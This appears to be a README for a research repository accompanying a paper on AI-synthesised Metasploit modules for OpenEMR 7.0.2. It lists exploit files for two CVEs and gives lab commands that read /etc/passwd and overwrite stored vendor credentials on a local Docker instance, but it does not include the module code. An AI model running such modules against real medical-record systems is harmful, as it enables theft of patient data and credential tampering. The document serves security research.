# AMENDER — Metasploit Exploit Module Synthesis for OpenEMR

Companion repository for the paper:
**"AMENDER: AI-Assisted Metasploit Exploit Module Synthesis via
Disclosure-Aware Extraction and Analyst-in-the-Loop Review for OpenEMR"**
(submitted to ICCFN 2026, under blind review)

---

## Repository Contents

| File | Description |
|---|---|
| `docker-compose.yml` | Spins up the vulnerable OpenEMR 7.0.2 lab environment |
| `openemr_702_exploit_ORIGINAL.py` | Original public PoC (baseline for Phase 1 analysis) |
| `openemr_702_exploit.py` | Refined exploit confirming CVE-2026-24849 |
| `savesetuptest.py` | PoC script confirming CVE-2026-33305 |
| `openemr_faxsms_read_cve_2026_24849.rb` | Metasploit auxiliary module for CVE-2026-24849 (arbitrary file read via EtherFax dispatcher) |
| `openemr_rcfax_dispose.rb` | Metasploit auxiliary module for sibling-class attack surface (RCFaxClient) |
| `openemr_save_setup_cve_2026_33305.rb` | Metasploit auxiliary module for CVE-2026-33305 (credential injection via saveSetup) |

---

## Vulnerabilities Covered

| CVE | CVSS | Description |
|---|---|---|
| CVE-2026-24849 | 9.9 | Arbitrary file read/write via `disposeDocument()` in `EtherFaxActions` |
| CVE-2026-33305 | — | Authorization bypass via unsanitised POST to `saveSetup()` |

---

## Prerequisites

- Docker and Docker Compose
- Metasploit Framework (`msfconsole`)
- Python 3 with `requests` library

---

## Step 1 — Start the Lab Environment

```bash
docker-compose up -d
```

This starts OpenEMR 7.0.2 on `http://localhost:8300`.
Default credentials: `admin` / `pass`.

Wait ~30 seconds for the container to fully initialise before running any modules.

---

## Step 2 — Copy Metasploit Modules

```bash
cp openemr_faxsms_read_cve_2026_24849.rb \
   ~/.msf4/modules/auxiliary/gather/

cp openemr_rcfax_dispose.rb \
   ~/.msf4/modules/auxiliary/gather/

cp openemr_save_setup_cve_2026_33305.rb \
   ~/.msf4/modules/auxiliary/gather/
```

---

## Step 3 — Run CVE-2026-24849 Module (File Read)

```bash
msfconsole -q
msf6 > reload_all
msf6 > use auxiliary/gather/openemr_faxsms_read_cve_2026_24849
msf6 > set RHOSTS 127.0.0.1
msf6 > set RPORT 8300
msf6 > set USERNAME admin
msf6 > set PASSWORD pass
msf6 > set TARGETFILE /etc/passwd
msf6 > run
```

Expected: contents of `/etc/passwd` returned in module output.

---

## Step 4 — Run CVE-2026-33305 Module (Credential Injection)

```bash
msf6 > use auxiliary/gather/openemr_save_setup_cve_2026_33305
msf6 > set RHOSTS 127.0.0.1
msf6 > set RPORT 8300
msf6 > set USERNAME admin
msf6 > set PASSWORD pass
msf6 > run
```

Expected: vendor credentials overwritten in OpenEMR database; module confirms write success.

---

## Step 5 — Verify with Python PoC (optional)

```bash
python3 openemr_702_exploit.py
```

Confirms CVE-2026-24849 is reachable before running the Metasploit module.

---

## Stopping the Lab

```bash
docker-compose down
```

---

## Notes

- All modules were synthesised by the AMENDER pipeline and validated against
  the lab environment described in the paper (Section 4).
- The conformance gates (χ1 Ruby syntax, χ2 msftidy, χ3 live functional)
  were all passed before the modules in this repository were accepted.
- Author identity withheld for blind review.
